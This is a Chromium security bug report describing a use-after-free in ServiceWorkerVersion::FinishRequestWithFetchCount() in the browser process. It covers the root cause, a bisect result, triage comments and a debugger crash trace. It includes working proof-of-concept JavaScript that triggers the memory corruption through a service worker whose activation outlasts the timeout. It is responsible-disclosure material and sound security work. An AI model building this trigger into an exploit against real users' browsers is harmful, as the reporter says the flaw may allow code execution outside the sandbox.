# Use After Free in ServiceWorkerVersion::FinishRequestWithFetchCount() in browser process.

| Field | Value |
|-------|-------|
| **Issue ID** | [440454442](https://issues.chromium.org/issues/440454442) |
| **Status** | New |
| **Severity** | S3-Low |
| **Priority** | P0 |
| **Component** | Blink>ServiceWorker |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | lo...@gmail.com |
| **Assignee** | yy...@chromium.org |
| **Created** | 2025-08-22 |
| **Bounty** | $43,000.00 |

## Description

VULNERABILITY DETAILS

	Specifically crafted web page can trigger Use After Free of InflightRequestTimeoutInfo object in ServiceWorkerVersion::FinishRequestWithFetchCount(). This bug may potentially be exploited to achieve one click Remote Code Execution in browser process (outside sandbox).

	ServiceWorkerVersion connects the actual script with a running service worker. ServiceWorkerVersion Handles requests of different types e.g. install, activate, fetch etc.
	These requests usually take some time and need to be processed asynchronously, so its member inflight_requests_ holds in-flight requests:

	  base::IDMap<std::unique_ptr<InflightRequest>> inflight_requests_;
	  
	Since these requests are subjected to expiry,  ServiceWorkerVersion also has member request_timeouts_ which is a set of InflightRequestTimeoutInfo to track the timeout information:

	  std::set<InflightRequestTimeoutInfo> request_timeouts_;

	When a request is started, a new InflightRequest object is created in  ServiceWorkerVersion::StartRequestWithCustomTimeout() and added to container inflight_requests_. An InflightRequestTimeoutInfo object is also created and added to container request_timeouts_. InflightRequest has one member "timeout_iter" that refers to the corresponding iterator in request_timeouts_.

		int ServiceWorkerVersion::StartRequestWithCustomTimeout()
		{
		  ...
		  auto request = std::make_unique<InflightRequest>(std::move(error_callback), clock_->Now(), tick_clock_->NowTicks(),event_type);
		  InflightRequest* request_rawptr = request.get();
		  int request_id = inflight_requests_.Add(std::move(request));
		  ...
		  auto [iter, is_inserted] = request_timeouts_.emplace(
			  request_id, event_type, expiration_time, timeout_behavior);
		  ...
		  request_rawptr->timeout_iter = iter;
		  ...
		}

	When the request is finished, the InflightRequest object is retrieved via request_id. The aforementioned "timeout_iter" member of InflightRequest is used to locate the InflightRequestTimeoutInfo inside request_timeouts_. The corresponding objects in   request_timeouts_ and inflight_requests_ are removed respectively.

		bool ServiceWorkerVersion::FinishRequestWithFetchCount() {
		  InflightRequest* request = inflight_requests_.Lookup(request_id);
		  ...
		  request_timeouts_.erase(request->timeout_iter);
		  inflight_requests_.Remove(request_id);
		  ...
		}

	Besides,  ServiceWorkerVersion periodically checks "request_timeouts_" for entries that should time out in ServiceWorkerVersion::OnTimeoutTimer() which executes every 30 seconds (kTimeoutTimerDelay = base::Seconds(30)):  

		void ServiceWorkerVersion::OnTimeoutTimer() {
		  ...
		  std::set<InflightRequestTimeoutInfo> request_timeouts;
		  request_timeouts.swap(request_timeouts_);
		  auto timeout_iter = request_timeouts.begin();
		  while (timeout_iter != request_timeouts.end()) {
			const InflightRequestTimeoutInfo& info = *timeout_iter;
			if (!RequestExpired(info.expiration_time)) {
			  break;
			}
			if (MaybeTimeoutRequest(info)) {
				...
			  }
			}
			timeout_iter = request_timeouts.erase(timeout_iter);
		  }
		  ...  
		  request_timeouts_.swap(request_timeouts);  
		  ...
		}

	If the request is expired, "error_callback" of the request is executed (in MaybeTimeoutRequest()). The InflightRequestTimeoutInfo entry is removed from request_timeouts_ in OnTimeoutTimer(), while the InflightRequest entry is removed from inflight_requests_ in MaybeTimeoutRequest().
	  
	bool ServiceWorkerVersion::MaybeTimeoutRequest(
		const InflightRequestTimeoutInfo& info) {
	  InflightRequest* request = inflight_requests_.Lookup(info.id);
	  ...
	  std::move(request->error_callback)
		  .Run(blink::ServiceWorkerStatusCode::kErrorTimeout);
	  inflight_requests_.Remove(info.id);
	  return true;
	}

	There is a problem with the swap operation against request_timeouts_ and the MaybeTimeoutRequest() method. 
	What if a new request object is added to "request_timeouts_" during these operations? Turns out it's possible.

	In the window code of the PoC, location.reload() is called after a service worker is registered with scope "/", the fetch request would be intercepted and served by the service worker which has a fetch event listener.

			navigator.serviceWorker.register("/svcworker0.js", {scope: "/"});
			setTimeout(function(){location.reload()},1000);
			
	In the service worker js code of the PoC, waitUntil() is used to delay the activation process of the service worker for 332000ms ( > 5 minutes). 

			const p1 = new Promise((resolve, reject) => {
			  setTimeout(() => {
				resolve("foo");
			  }, 332000);
			});

			this.onactivate = function (e) {
				e.waitUntil(p1);
			};
			
	So the activation request would expire (kRequestTimeout = 5 minutes) before the activate handler returns.  The timeout value of 332000ms is picked to be > kRequestTimeout + kTimeoutTimerDelay = 5 minutes + 30s = 3300000ms, so ServiceWorkerVersion::OnTimeoutTimer() is definitely called after the activate request expires but before the activate handler returns. 

	Therefore, the "error_callback" (which is "ServiceWorkerRegistration::OnActivateEventFinished())of the request is executed from aybeTimeoutRequest(). This ultimately leads to the creation of a new InflightRequestTimeoutInfo object for the fetch operation:

		ServiceWorkerVersion::MaybeTimeoutRequest()
		  ServiceWorkerRegistration::OnActivateEventFinished()
			ServiceWorkerVersion::SetStatus()
			  ServiceWorkerControlleeRequestHandler::ContinueWithActivatedVersion()
				ServiceWorkerControlleeRequestHandler::CreateLoaderAndStartRequest()
				  NavigationURLLoaderImpl::MaybeStartLoader()
					NavigationURLLoaderImpl::StartInterceptedRequest()
					  NavigationURLLoaderImpl::CreateThrottlingLoaderAndStart()
						ThrottlingURLLoader::CreateLoaderAndStart()
						  ThrottlingURLLoader::Start()
							ThrottlingURLLoader::StartNow()
							  URLLoaderFactory::CreateLoaderAndStart()
								SingleRequestURLLoaderFactory::CreateLoaderAndStart()
								  SingleRequestURLLoaderFactory::HandlerState::CreateLoaderAndStart()
									ServiceWorkerMainResourceLoader::StartRequest()
									  ServiceWorkerFetchDispatcher::StartWorker()
										ServiceWorkerFetchDispatcher::DispatchFetchEvent()
										  ServiceWorkerVersion::StartRequest(()
											ServiceWorkerVersion::StartRequestWithCustomTimeout()

	As described above, a new InflightRequest object for the fetch operation is created in  ServiceWorkerVersion::StartRequestWithCustomTimeout() and added to container inflight_requests_. An InflightRequestTimeoutInfo object is also created and added to container request_timeouts_.
	 
	However, because the swap operation ("request_timeouts.swap(request_timeouts_)") in ServiceWorkerVersion::OnTimeoutTimer(), the new InflightRequestTimeoutInfo object is in member variable request_timeouts_, but is NOT in the local variable request_timeouts. After the timeout checkings and callback executions and the second swap call ("request_timeouts_.swap(request_timeouts)"), the new InflightRequestTimeoutInfo object is in the local variable request_timeouts, but NOT in the member variable request_timeouts_. on the exit of function ServiceWorkerVersion::OnTimeoutTimer(), as the local variable goes out of scope, the new InflightRequestTimeoutInfo object is unexpectedly freed.

	At this point, there is inconsistency between request_timeouts_ and inflight_requests_. The new InflightRequest object is still in inflight_requests_, but there is NO corresponding InflightRequestTimeoutInfo object in container request_timeouts_. 

	When the fetch handler JS code finally returns,  ServiceWorkerVersion::FinishRequestWithFetchCount() gets executed. The operations based on the stale "request->timeout_iter" pointer is Use After Free (and/or double free).

	I believe this bug probably affects all OSs across all release channels. Crash state on MacOS (UAF_FinishRequestWithFetchCount_crashState_Mac.txt) and ASAN report (UAF_FinishRequestWithFetchCount_ASAN.txt) are also collected and attached here for your reference.	  

  
VERSION
	Google Chrome	141.0.7354.4 (Official Build) dev (64-bit) (cohort: Control) 
	Revision	b3cc3de50fcf9008fcd6ef93a660b1aa16c7933d-refs/branch-heads/7354@{#5}
	OS	Windows 11 Version 24H2 (Build 26100.4946)
	JavaScript	V8 14.1.56

BISECT
	Commit that introduced the bug :
		https://source.chromium.org/chromium/chromium/src/+/5926fa916d9ad53c77e31ee757e1979275d7466c
		(Committed on 2022-07-13 11:21 AM)
		

REPRODUCTION CASE  (whole server code in UAF_FinishRequestWithFetchCount_PoC.js)

	window code:

		<script>
		navigator.serviceWorker.register("/svcworker0.js", {scope: "/"});
		setTimeout(function(){location.reload()},1000);
		</script>

	Service worker code (svcworker0.js):
		const p1 = new Promise((resolve, reject) => {
		  setTimeout(() => {
			resolve("foo");
		  }, 332000);
		});

		this.onactivate = function (e) {
			e.waitUntil(p1);
		};
		this.onfetch = function (e) {
			e.waitUntil(new Promise(resolve => setTimeout(resolve, 1)));
		};

Steps to reproduce:
1) Run the PoC with NodeJS: node UAF_FinishRequestWithFetchCount_PoC.js
2) Enter http://localhost:12345/ from the chrome browser

    
FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: browser
Crash State: 

	(30a0.af88): Access violation - code c0000005 (!!! second chance !!!)
	chrome!std::__Cr::__tree_min+0x3 [inlined in chrome!std::__Cr::__tree<std::__Cr::__value_type<std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> >,std::__Cr::vector<media::ChunkDemuxerStream *,std::__Cr::allocator<media::ChunkDemuxerStream *> > >,std::__Cr::__map_value_compare<std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> >,std::__Cr::pair<const std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> >,std::__Cr::vector<media::ChunkDemuxerStream *,std::__Cr::allocator<media::ChunkDemuxerStream *> > >,std::__Cr::less<std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> > >,1>,std::__Cr::allocator<std::__Cr::pair<const std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> >,std::__Cr::vector<media::ChunkDemuxerStream *,std::__Cr::allocator<media::ChunkDemuxerStream *> > > > >::__remove_node_pointer+0x47]:
	00007ff8`b2abd637 488b12          mov     rdx,qword ptr [rdx] ds:54415541`56415741=????????????????
	0:000> r
	rax=5441554156415741 rbx=0000000000000003 rcx=00002f2c02118150
	rdx=5441554156415741 rsi=00000074515fd338 rdi=00002f2c044ff430
	rip=00007ff8b2abd637 rsp=00000074515fd2c0 rbp=000000000838b500
	 r8=00002f2c04518680  r9=0000000000000001 r10=000000000002bf20
	r11=0000000000000032 r12=0000000000000000 r13=00000074515fd458
	r14=00002f2c021180f8 r15=00002f2c04518680
	iopl=0         nv up ei pl nz na po nc
	cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010204
	chrome!std::__Cr::__tree_min+0x3 [inlined in chrome!std::__Cr::__tree<std::__Cr::__value_type<std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> >,std::__Cr::vector<media::ChunkDemuxerStream *,std::__Cr::allocator<media::ChunkDemuxerStream *> > >,std::__Cr::__map_value_compare<std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> >,std::__Cr::pair<const std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> >,std::__Cr::vector<media::ChunkDemuxerStream *,std::__Cr::allocator<media::ChunkDemuxerStream *> > >,std::__Cr::less<std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> > >,1>,std::__Cr::allocator<std::__Cr::pair<const std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> >,std::__Cr::vector<media::ChunkDemuxerStream *,std::__Cr::allocator<media::ChunkDemuxerStream *> > > > >::__remove_node_pointer+0x47]:
	00007ff8`b2abd637 488b12          mov     rdx,qword ptr [rdx] ds:54415541`56415741=????????????????
	0:000> dv
				__x = 0x54415541`56415741
	0:000> dx -id 0,0 -r1 ((chrome!std::__Cr::__tree_node_base<void *> *)0x5441554156415741)
	((chrome!std::__Cr::__tree_node_base<void *> *)0x5441554156415741)                 : 0x5441554156415741 [Type: std::__Cr::__tree_node_base<void *> *]
		[+0x000] __left_          : Unable to read memory at Address 0x5441554156415741
		[+0x008] __right_         : Unable to read memory at Address 0x5441554156415749
		[+0x010] __parent_        : Unable to read memory at Address 0x5441554156415751
		[+0x018] __is_black_      : Unable to read memory at Address 0x5441554156415759
	0:000> k
	 # Child-SP          RetAddr               Call Site
	00 (Inline Function) --------`--------     chrome!std::__Cr::__tree_min+0x3 [C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\__tree @ 163] 
	01 (Inline Function) --------`--------     chrome!std::__Cr::__tree_next_iter+0x3f [C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\__tree @ 192] 
	02 (Inline Function) --------`--------     chrome!std::__Cr::__tree_iterator<std::__Cr::__value_type<std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> >,std::__Cr::vector<media::ChunkDemuxerStream *,std::__Cr::allocator<media::ChunkDemuxerStream *> > >,std::__Cr::__tree_node<std::__Cr::__value_type<std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> >,std::__Cr::vector<media::ChunkDemuxerStream *,std::__Cr::allocator<media::ChunkDemuxerStream *> > >,void *> *,long long>::operator+++0x3f [C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\__tree @ 655] 
	03 00000074`515fd2c0 00007ff8`b2be393f     chrome!std::__Cr::__tree<std::__Cr::__value_type<std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> >,std::__Cr::vector<media::ChunkDemuxerStream *,std::__Cr::allocator<media::ChunkDemuxerStream *> > >,std::__Cr::__map_value_compare<std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> >,std::__Cr::pair<const std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> >,std::__Cr::vector<media::ChunkDemuxerStream *,std::__Cr::allocator<media::ChunkDemuxerStream *> > >,std::__Cr::less<std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> > >,1>,std::__Cr::allocator<std::__Cr::pair<const std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> >,std::__Cr::vector<media::ChunkDemuxerStream *,std::__Cr::allocator<media::ChunkDemuxerStream *> > > > >::__remove_node_pointer+0x47 [C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\__tree @ 1807] 
	04 (Inline Function) --------`--------     chrome!std::__Cr::__tree<content::ServiceWorkerVersion::InflightRequestTimeoutInfo,std::__Cr::less<content::ServiceWorkerVersion::InflightRequestTimeoutInfo>,std::__Cr::allocator<content::ServiceWorkerVersion::InflightRequestTimeoutInfo> >::erase+0x8 [C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\__tree @ 1937] 
	05 (Inline Function) --------`--------     chrome!std::__Cr::set<content::ServiceWorkerVersion::InflightRequestTimeoutInfo,std::__Cr::less<content::ServiceWorkerVersion::InflightRequestTimeoutInfo>,std::__Cr::allocator<content::ServiceWorkerVersion::InflightRequestTimeoutInfo> >::erase+0x8 [C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\set @ 772] 
	06 00000074`515fd2f0 00007ff8`b48aefe5     chrome!content::ServiceWorkerVersion::FinishRequestWithFetchCount+0xbf [C:\b\s\w\ir\cache\builder\src\content\browser\service_worker\service_worker_version.cc @ 852] 
	07 00000074`515fd3a0 00007ff8`b48aeeb7     chrome!content::ServiceWorkerFetchDispatcher::ResponseCallback::HandleResponse+0x55 [C:\b\s\w\ir\cache\builder\src\content\browser\service_worker\service_worker_fetch_dispatcher.cc @ 388] 
	08 00000074`515fd420 00007ff8`afd081d2     chrome!content::ServiceWorkerFetchDispatcher::ResponseCallback::OnFallback+0xa7 [C:\b\s\w\ir\cache\builder\src\content\browser\service_worker\service_worker_fetch_dispatcher.cc @ 375] 
	09 00000074`515fd4d0 00007ff8`b1f95b42     chrome!blink::mojom::ServiceWorkerFetchResponseCallbackStubDispatch::Accept+0x2e2 [C:\b\s\w\ir\cache\builder\src\out\ff92-win64-clang\gen\third_party\blink\public\mojom\service_worker\service_worker_fetch_response_callback.mojom.cc @ 536] 
	0a (Inline Function) --------`--------     chrome!mojo::InterfaceEndpointClient::HandleValidatedMessage+0x14a [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc @ 1059] 
	0b 00000074`515fd5c0 00007ff8`b185d79b     chrome!mojo::InterfaceEndpointClient::HandleIncomingMessageThunk::Accept+0x172 [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc @ 377] 
	0c (Inline Function) --------`--------     chrome!mojo::MessageDispatcher::Accept+0x3ad [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\message_dispatcher.cc @ 43] 
	0d (Inline Function) --------`--------     chrome!mojo::InterfaceEndpointClient::HandleIncomingMessage+0x475 [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc @ 731] 
	0e (Inline Function) --------`--------     chrome!mojo::internal::MultiplexRouter::ProcessIncomingMessage+0x71c [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\multiplex_router.cc @ 1147] 
	0f 00000074`515fd680 00007ff8`b222507e     chrome!mojo::internal::MultiplexRouter::Accept+0x9eb [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\multiplex_router.cc @ 759] 
	10 00000074`515fda80 00007ff8`b039cbb6     chrome!mojo::MessageDispatcher::Accept+0x38e [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\message_dispatcher.cc @ 43] 
	11 (Inline Function) --------`--------     chrome!mojo::Connector::DispatchMessageW+0x205 [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\connector.cc @ 560] 
	12 (Inline Function) --------`--------     chrome!mojo::Connector::ReadAllAvailableMessages+0x2e2 [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\connector.cc @ 619] 
	13 (Inline Function) --------`--------     chrome!mojo::Connector::OnHandleReadyInternal+0x2ea [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\connector.cc @ 450] 
	14 (Inline Function) --------`--------     chrome!mojo::Connector::OnWatcherHandleReady+0x2f7 [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\connector.cc @ 416] 
	15 (Inline Function) --------`--------     chrome!base::internal::DecayedFunctorTraits<void (Connector::*)(const char *, unsigned int),mojo::Connector *,const char *const &>::Invoke+0x307 [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 731] 
	16 (Inline Function) --------`--------     chrome!base::internal::InvokeHelper<0,base::internal::FunctorTraits<void (Connector::*const &)(const char *, unsigned int),mojo::Connector *,const char *const &>,void,0,1>::MakeItSo+0x31c [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 923] 
	17 (Inline Function) --------`--------     chrome!base::internal::Invoker<base::internal::FunctorTraits<void (Connector::*const &)(const char *, unsigned int),mojo::Connector *,const char *const &>,base::internal::BindState<1,1,0,void (Connector::*)(const char *, unsigned int),base::internal::UnretainedWrapper<mojo::Connector,base::unretained_traits::MayNotDangle,0>,base::internal::UnretainedWrapper<const char,base::unretained_traits::MayNotDangle,0> >,void (unsigned int)>::RunImpl+0x31c [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 1060] 
	18 00000074`515fdb60 00007ff8`b0f61daf     chrome!base::internal::Invoker<base::internal::FunctorTraits<void (Connector::*const &)(const char *, unsigned int),mojo::Connector *,const char *const &>,base::internal::BindState<1,1,0,void (Connector::*)(const char *, unsigned int),base::internal::UnretainedWrapper<mojo::Connector,base::unretained_traits::MayNotDangle,0>,base::internal::UnretainedWrapper<const char,base::unretained_traits::MayNotDangle,0> >,void (unsigned int)>::Run+0x356 [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 980] 
	19 (Inline Function) --------`--------     chrome!base::RepeatingCallback<void (unsigned int)>::Run+0x3b [C:\b\s\w\ir\cache\builder\src\base\functional\callback.h @ 344] 
	1a (Inline Function) --------`--------     chrome!mojo::SimpleWatcher::DiscardReadyState+0x3b [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\system\simple_watcher.h @ 192] 
	1b (Inline Function) --------`--------     chrome!base::internal::DecayedFunctorTraits<void (*)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &),const base::RepeatingCallback<void (unsigned int)> &>::Invoke+0x50 [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 664] 
	1c (Inline Function) --------`--------     chrome!base::internal::InvokeHelper<0,base::internal::FunctorTraits<void (*const &)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &),const base::RepeatingCallback<void (unsigned int)> &>,void,0>::MakeItSo+0x50 [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 923] 
	1d (Inline Function) --------`--------     chrome!base::internal::Invoker<base::internal::FunctorTraits<void (*const &)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &),const base::RepeatingCallback<void (unsigned int)> &>,base::internal::BindState<0,1,0,void (*)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &),base::RepeatingCallback<void (unsigned int)> >,void (unsigned int, const mojo::HandleSignalsState &)>::RunImpl+0x50 [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 1060] 
	1e (Inline Function) --------`--------     chrome!base::internal::Invoker<base::internal::FunctorTraits<void (*const &)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &),const base::RepeatingCallback<void (unsigned int)> &>,base::internal::BindState<0,1,0,void (*)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &),base::RepeatingCallback<void (unsigned int)> >,void (unsigned int, const mojo::HandleSignalsState &)>::Run+0x55 [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 980] 
	1f (Inline Function) --------`--------     chrome!base::RepeatingCallback<void (unsigned int, const mojo::HandleSignalsState &)>::Run+0x90 [C:\b\s\w\ir\cache\builder\src\base\functional\callback.h @ 344] 
	20 (Inline Function) --------`--------     chrome!mojo::SimpleWatcher::OnHandleReady+0x137 [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\system\simple_watcher.cc @ 278] 
	21 (Inline Function) --------`--------     chrome!base::internal::DecayedFunctorTraits<void (SimpleWatcher::*)(int, unsigned int, const mojo::HandleSignalsState &),base::WeakPtr<mojo::SimpleWatcher> &&,int &&,unsigned int &&,mojo::HandleSignalsState &&>::Invoke+0x174 [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 731] 
	22 (Inline Function) --------`--------     chrome!base::internal::InvokeHelper<1,base::internal::FunctorTraits<void (SimpleWatcher::*&&)(int, unsigned int, const mojo::HandleSignalsState &),base::WeakPtr<mojo::SimpleWatcher> &&,int &&,unsigned int &&,mojo::HandleSignalsState &&>,void,0,1,2,3>::MakeItSo+0x198 [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 947] 
	23 (Inline Function) --------`--------     chrome!base::internal::Invoker<base::internal::FunctorTraits<void (SimpleWatcher::*&&)(int, unsigned int, const mojo::HandleSignalsState &),base::WeakPtr<mojo::SimpleWatcher> &&,int &&,unsigned int &&,mojo::HandleSignalsState &&>,base::internal::BindState<1,1,0,void (SimpleWatcher::*)(int, unsigned int, const mojo::HandleSignalsState &),base::WeakPtr<mojo::SimpleWatcher>,int,unsigned int,mojo::HandleSignalsState>,void ()>::RunImpl+0x198 [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 1060] 
	24 (Inline Function) --------`--------     chrome!base::internal::Invoker<base::internal::FunctorTraits<void (SimpleWatcher::*&&)(int, unsigned int, const mojo::HandleSignalsState &),base::WeakPtr<mojo::SimpleWatcher> &&,int &&,unsigned int &&,mojo::HandleSignalsState &&>,base::internal::BindState<1,1,0,void (SimpleWatcher::*)(int, unsigned int, const mojo::HandleSignalsState &),base::WeakPtr<mojo::SimpleWatcher>,int,unsigned int,mojo::HandleSignalsState>,void ()>::RunOnce+0x198 [C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h @ 973] 
	25 (Inline Function) --------`--------     chrome!base::OnceCallback<void ()>::Run+0x502 [C:\b\s\w\ir\cache\builder\src\base\functional\callback.h @ 156] 
	26 (Inline Function) --------`--------     chrome!base::TaskAnnotator::RunTaskImpl+0x5f2 [C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc @ 207] 
	27 (Inline Function) --------`--------     chrome!base::TaskAnnotator::RunTask+0x652 [C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.h @ 104] 
	28 (Inline Function) --------`--------     chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl+0xcfc [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 473] 
	29 00000074`515fdd20 00007ff8`b0fda20d     chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork+0xd8f [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 347] 
	2a 00000074`515fe530 00007ff8`adb2b6ac     chrome!base::MessagePumpForUI::DoRunLoop+0x7d [C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_win.cc @ 264] 
	2b 00000074`515fe630 00007ff8`b2233112     chrome!base::MessagePumpWin::Run+0xac [C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_win.cc @ 88] 
	2c 00000074`515fe6a0 00007ff8`ae3d40c6     chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run+0xf2 [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 651] 
	2d 00000074`515fe730 00007ff8`ae528466     chrome!base::RunLoop::Run+0x1c6 [C:\b\s\w\ir\cache\builder\src\base\run_loop.cc @ 136] 
	2e 00000074`515fe840 00007ff8`ae528135     chrome!content::BrowserMainLoop::RunMainMessageLoop+0xc6 [C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_loop.cc @ 1111] 
	2f (Inline Function) --------`--------     chrome!content::BrowserMainRunnerImpl::Run+0xf [C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_runner_impl.cc @ 156] 
	30 00000074`515fe8b0 00007ff8`ae526ccf     chrome!content::BrowserMain+0x125 [C:\b\s\w\ir\cache\builder\src\content\browser\browser_main.cc @ 32] 
	31 (Inline Function) --------`--------     chrome!content::RunBrowserProcessMain+0x97 [C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc @ 701] 
	32 00000074`515fe970 00007ff8`ae4da638     chrome!content::ContentMainRunnerImpl::RunBrowser+0x7af [C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc @ 1278] 
	33 00000074`515feb60 00007ff8`ae4d9892     chrome!content::ContentMainRunnerImpl::Run+0x268 [C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc @ 1127] 
	34 (Inline Function) --------`--------     chrome!content::RunContentProcess+0x351 [C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc @ 356] 
	35 00000074`515fece0 00007ff8`ae4d8084     chrome!content::ContentMain+0x3c2 [C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc @ 369] 
	36 00000074`515fef20 00007ff7`72d81d07     chrome!ChromeMain+0x2a4 [C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc @ 224] 
	37 00000074`515ff1b0 00007ff7`72d8080b     chrome_exe!MainDllLoader::Launch+0x407 [C:\b\s\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc @ 201] 
	38 00000074`515ff440 00007ff7`72eaf6f2     chrome_exe!wWinMain+0x23b [C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc @ 352] 
	39 (Inline Function) --------`--------     chrome_exe!invoke_main+0x21 [D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 118] 
	3a 00000074`515ff840 00007ff9`d632e8d7     chrome_exe!__scrt_common_main_seh+0x106 [D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 288] 
	3b 00000074`515ff880 00007ff9`d6bdc34c     KERNEL32!BaseThreadInitThunk+0x17
	3c 00000074`515ff8b0 00000000`00000000     ntdll!RtlUserThreadStart+0x2c


	
CREDIT INFORMATION
Reporter credit: Looben Yang

## Attachments

- UAF_FinishRequestWithFetchCount_PoC.js (text/javascript, 1.4 KB)
- UAF_FinishRequestWithFetchCount_ASAN.txt (text/plain, 47.2 KB)
- UAF_FinishRequestWithFetchCount_crashState_Mac.txt (text/plain, 10.4 KB)
- UAF_FinishRequestWithFetchCount_PoC_OnPipeConnectionError.js (text/javascript, 1.7 KB)
- UAF_FinishRequestWithFetchCount_OnPipeConnectionError_ASAN.txt (text/plain, 48.7 KB)
- UAF_FinishRequestWithFetchCount_OnPipeConnectionError_crashState_dev.txt (text/plain, 15.2 KB)

## Timeline

### cl...@appspot.gserviceaccount.com (2025-08-22)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6164830104780800.

### an...@chromium.org (2025-08-22)

Hello, thanks for the detailed report, stack trace and bisect!

@yyanagisawa, I have not been able to repro on my linux cloudtop and I couldn't get clusterfuzz to repro it either (but that is likely operator error).
I think there is enough information here however that makes it plausible for triaging.

Assigned S0 (critical) severity because of browser process memory corruption, FoundIn to 138 (extended stable) as this code has been around for a while. Set platforms to Win,Mac,Linux for now. Please feel free to modify if necessary.

### lo...@gmail.com (2025-08-22)

Please note that there is 5m+ timer in the PoC, so it may take a while to trigger. 

Will clusterfuzz kill the test case if the test case runs for a few seconds? If so then probably you'll need to run it manually.

I crafted the PoC with self retry, so if the bug is not triggered in the first run, just leave it and it still will trigger ultimately.

Since service worker would be persistent in the system after installation, I have added self-cleanup in the server code ('response.writeHead(200, {'Clear-Site-Data': '"storage"'});'). If clusterfuzz does not have this, then retry would not be valid too. 
